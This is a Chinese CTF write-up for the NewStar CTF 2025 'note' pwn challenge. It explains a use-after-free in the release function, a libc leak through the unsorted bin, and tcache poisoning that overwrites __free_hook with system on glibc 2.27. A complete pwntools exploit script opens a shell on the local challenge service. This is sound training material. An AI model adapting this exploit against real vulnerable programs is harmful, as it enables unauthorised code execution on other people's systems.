---
titleTemplate: ":title | WriteUp - NewStar CTF 2025"
---

# note

程序提供了一个菜单，并且提供了 `add`，`show`，`change`，`release` 的功能，我们逐个函数来看

![add 函数分析](/assets/images/wp/2025/week5/note_1.jpg)

`add` 函数中程序读取了 `index` 和 `size`，并将 `size` 存入 `chunk_size` 中，将 `malloc(size)` 申请到的堆块地址存入 `chunk_list` 中，`chunk_size` 和 `chunk_list` 均为全局变量。随后通过一个 `read` 可以设置堆块的内容。

![change 函数分析](/assets/images/wp/2025/week5/note_2.jpg)

`change` 函数可以通过指定 `index` 设置指定堆块的内容

![show 函数分析](/assets/images/wp/2025/week5/note_3.jpg)

`show` 函数可以通过指定 `index` 去打印指定堆块的内容

![release 函数 UAF 漏洞](/assets/images/wp/2025/week5/note_4.jpg)

`release` 函数允许通过 `index` 去释放指定堆块，但是在 `free` 之后没有将 `chunk_list` 的 `index` 位置置零，因此还是可以通过这个 `index` 去访问这块已经释放的内存，存在一个经典的 `UAF` 漏洞

![glibc 版本信息](/assets/images/wp/2025/week5/note_5.jpg)

由于堆利用手法与版本有关，因此我们查看 glibc 版本

![tcache bin 调试信息](/assets/images/wp/2025/week5/note_6.jpg)

使用 glibc 版本是 `2.27-3ubuntu1.6`，这个版本开启了 `tcache bin`，和用户交互默认为 `tcache bin`，同时在这个版本中存在 `__malloc_hook` 和 `__free_hook` 可以攻击，所以我们考虑通过这个 UAF 去挟持堆块的申请地址，这样下一次申请就可以控制堆块申请到 `__free_hook` 处，这样就可以修改其为 `system` 的地址，这样只要执行 free，堆块中的内容只要是 `/bin/sh` 即可拿到权限

如何泄露 libc 呢？当我们申请的堆块足够大，释放后就会进入 `unsorted bin`，在其中会有一个 `libc` 地址，通过这个地址就可以泄露 `libc` 后计算 `system` 和 `__free_hook` 的地址

![unsorted bin 泄露 libc](/assets/images/wp/2025/week5/note_7.png)

```python
from pwn import *
from LibcSearcher import *
from ctypes import *

context(os="linux",arch="amd64",log_level="debug")

io = remote("127.0.0.1", 11223)

# elf = ELF("./pwn")
libc = ELF("./libc-2.27.so")

def cmd(i, prompt=b"input your choice >>>"):
    io.sendlineafter(prompt, i)
def add(idx, size, co):
    cmd(b"1")
    io.recvuntil(b"input index:")
    io.sendline(str(idx).encode())
    io.recvuntil(b"input size")
    io.sendline(str(size).encode())
    io.recvuntil(b"input your note:")
    io.send(co)
    # ......
def edit(idx, co):
    cmd(b"2")
    io.recvuntil(b"input index:")
    io.sendline(str(idx).encode())
    io.recvuntil(b"input your new note:")
    io.send(co)
    # ......
def show(idx):
    cmd(b"3")
    io.recvuntil(b"input index")
    io.sendline(str(idx).encode())
    # ......
def dele(idx):
    cmd(b"4")
    io.recvuntil(b"input index")
    io.sendline(str(idx).encode())
    # ......
def dbg():
    gdb.attach(io)
    pause()

add(0, 0x450, b"AAAA")
add(1, 0x50, b"AAAA")
add(2, 0x50, b"AAAA")
add(3, 0x50, b"/bin/sh\x00")
dele(0)
show(0)
libc_base = u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b'\x00'))-0x3ebca0
free_hook = libc_base + libc.sym["__free_hook"]
system = libc_base + libc.sym["system"]
print("libc_base"+hex(libc_base))
print("free_hook"+hex(free_hook))
print("system"+hex(system))

dele(2)
dele(1)
show(1)
io.recvuntil(b"now, show the note: ")
heap_base = u64(io.recv(6).ljust(8,b'\x00'))-0x720
print("heap_base"+hex(heap_base))

edit(1, p64(free_hook))
add(4, 0x50, b"BBBB")
add(5, 0x50, p64(system))

# gdb.attach(io)
pause()

dele(3)

io.interactive()
```
